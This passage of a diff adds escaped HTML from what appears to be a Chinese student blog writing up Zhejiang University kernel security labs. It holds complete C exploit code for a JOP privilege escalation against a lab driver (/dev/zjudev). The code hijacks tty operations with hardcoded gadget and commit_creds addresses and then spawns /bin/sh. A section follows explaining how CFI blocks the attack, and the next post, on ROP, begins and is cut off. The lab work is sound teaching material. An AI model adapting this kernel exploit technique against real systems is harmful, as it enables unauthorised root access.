+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_STRUCT_SIZE 0x2B8
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_MAGIC 0x5401
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define ZJU_GADGET_ONE_ADDR 0xffff80001083aa44
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define ZJU_GADGET_TWO_ADDR 0xffff80001083aa5c
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define ZJU_GADGET_THREE_ADDR 0xffff80001083aa74
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PREPARE_KERNEL_CRED_ADDR 0xffff8000100b6030
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define COMMIT_CREDS_ADDR 0xffff8000100b5bac
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">size_t&lt;/span> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">36&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">init_dev&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/zjudev&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/zjudev&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0001&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">dev2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">init_ptmx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(;;)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ptmx_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/ptmx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_NOCTTY&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">v_str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v_str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v_str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tty_buf + %lu = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v_str&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">magic&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">magic&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TTY_MAGIC&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;TTY_MAGIC match! ptmx_fd = %d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">exp_task3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Jump into exp_task3!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">my_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x40&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">prepare_kernel_cred_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PREPARE_KERNEL_CRED_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">commit_creds_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">COMMIT_CREDS_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x28&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">prepare_kernel_cred_addr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x38&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">commit_creds_addr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">my_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ZJU_GADGET_THREE_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">tty_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mh">0xffff000000000000&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tty_addr = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_addr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ZJU_GADGET_TWO_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">commit_creds_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">my_buf&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mh">0xffff000000000000&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;commit_creds_addr = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">commit_creds_addr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ZJU_GADGET_ONE_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">commit_creds_addr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">init_dev&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">init_ptmx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exp_task3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="task4内核cfi保护">Task4：内核CFI保护&lt;/h2>
+&lt;ul>
+&lt;li>使用&lt;code>objdump&lt;/code>反汇编开启CFI的内核镜像 &lt;code>vmlinux&lt;/code>，获得汇编代码，提交任意一个间接调用的汇编代码，并详细解释CFI是如何防御JOP攻击&lt;/li>
+&lt;/ul>
+&lt;p>我们分别在开始CFI和没开启CFI的vmlinux镜像中反汇编&lt;code>tty_driver_flush_buffer&lt;/code>函数，关键代码如下&lt;/p>
+&lt;p>CFI:&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606211049596.png"
+width="848"
+height="596"
+srcset="https://unicocn.github.io/p/jop/image-20230606211049596_hud77ec3916f7c82eec330fd73c791f067_108082_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606211049596_hud77ec3916f7c82eec330fd73c791f067_108082_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 2"
+class="gallery-image"
+data-flex-grow="142"
+data-flex-basis="341px"
+>&lt;/p>
+&lt;p>NoCFI:&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606211100002.png"
+width="747"
+height="241"
+srcset="https://unicocn.github.io/p/jop/image-20230606211100002_hu19cd443c31c154b6bee5b0227d1a82f3_33401_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606211100002_hu19cd443c31c154b6bee5b0227d1a82f3_33401_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 3"
+class="gallery-image"
+data-flex-grow="309"
+data-flex-basis="743px"
+>&lt;/p>
+&lt;p>关注如下片段：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ffff800008bd9594: b4000108 cbz x8, ffff800008bd95b4 &amp;lt;tty_driver_flush_buffer+0x38&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd9598: d00061c9 adrp x9, ffff800009813000 &amp;lt;regulator_get_current_limit.cfi_jt&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd959c: 912d0129 add x9, x9, #0xb40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd95a0: cb090109 sub x9, x8, x9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd95a4: 93c90d29 ror x9, x9, #3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd95a8: f100a93f cmp x9, #0x2a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ffff800008bd95ac: 540000c2 b.cs ffff800008bd95c4 &amp;lt;tty_driver_flush_buffer+0x48&amp;gt; // b.hs, b.nlast
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以看到在开启了CFI之后，出现了&lt;code>regulator_get_current_limit.cfi_jt&lt;/code>标签，如果x8和x9寄存器的值不满足要求，就会跳转到该标签对应的函数处，之后调用&lt;code>handle_cfi_failure&lt;/code>处理CFI failure；总结来说，CFI通过对函数跳转地址的检查，进而防止JOP攻击&lt;/p>
+&lt;ul>
+&lt;li>重新运行JOP攻击程序，查看是否CFI是否能起作用。提交demsg中包含CFI Failure截图&lt;/li>
+&lt;/ul>
+&lt;p>重新运行JOP攻击程序，发现CFI生效，无法跳转到目标函数&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606204222585.png"
+width="488"
+height="188"
+srcset="https://unicocn.github.io/p/jop/image-20230606204222585_hu6a18e47d21c4aa5b7dcd79617fe8e62d_12457_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606204222585_hu6a18e47d21c4aa5b7dcd79617fe8e62d_12457_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 4"
+class="gallery-image"
+data-flex-grow="259"
+data-flex-basis="622px"
+>&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606204234703.png"
+width="475"
+height="439"
+srcset="https://unicocn.github.io/p/jop/image-20230606204234703_hu4a553b9aa827ccab8b4b73309c20b189_24373_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606204234703_hu4a553b9aa827ccab8b4b73309c20b189_24373_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 5"
+class="gallery-image"
+data-flex-grow="108"
+data-flex-basis="259px"
+>&lt;/p>
+&lt;p>之后调用&lt;code>dmesg&lt;/code>，发现触发了&lt;code>cfi_failure&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606210712108.png"
+width="470"
+height="135"
+srcset="https://unicocn.github.io/p/jop/image-20230606210712108_hu0b27f953a46820fd805c8b30a6a6a55b_8890_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606210712108_hu0b27f953a46820fd805c8b30a6a6a55b_8890_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 6"
+class="gallery-image"
+data-flex-grow="348"
+data-flex-basis="835px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.&lt;/p>
+&lt;/blockquote></description></item><item><title>ROP | Linux内核攻防</title><link>https://unicocn.github.io/p/rop/</link><pubDate>Wed, 07 Jun 2023 22:50:00 +0000</pubDate><guid>https://unicocn.github.io/p/rop/</guid><description>&lt;img src="https://unicocn.github.io/p/rop/cover.jpg" alt="Featured image of post ROP | Linux内核攻防" />&lt;h1 id="rop--linux内核攻防">ROP | Linux内核攻防&lt;/h1>
+&lt;blockquote>
+&lt;p>Link: &lt;a class="link" href="https://zjusec.gitee.io/syssec23-stu/lab2/" target="_blank" rel="noopener"
+>https://zjusec.gitee.io/syssec23-stu/lab2/&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="task1绕过stack-canary和kaslr">Task1：绕过stack canary和KASLR&lt;/h2>
+&lt;ol>
+&lt;li>首先根据实验指南，当我们&lt;code>read&lt;/code>时，读取的是全局变量&lt;code>prev_cmd&lt;/code>，而当我们&lt;code>write&lt;/code>的时候，会将&lt;code>buffer&lt;/code>先赋值给&lt;code>cmd&lt;/code>，再将&lt;code>cmd&lt;/code>赋值给&lt;code>prev_cmd&lt;/code>；在&lt;code>zjubof_write4&lt;/code>中，看似对&lt;code>cmd.length&lt;/code>作出了限制，但是并没有对&lt;code>len&lt;/code>作出限制，因此存在overflow漏洞，可以通过溢出修改&lt;code>cmd.length&lt;/code>，进而将&lt;code>canary/oldfp/ra&lt;/code>读到&lt;code>prev_cmd&lt;/code>中&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
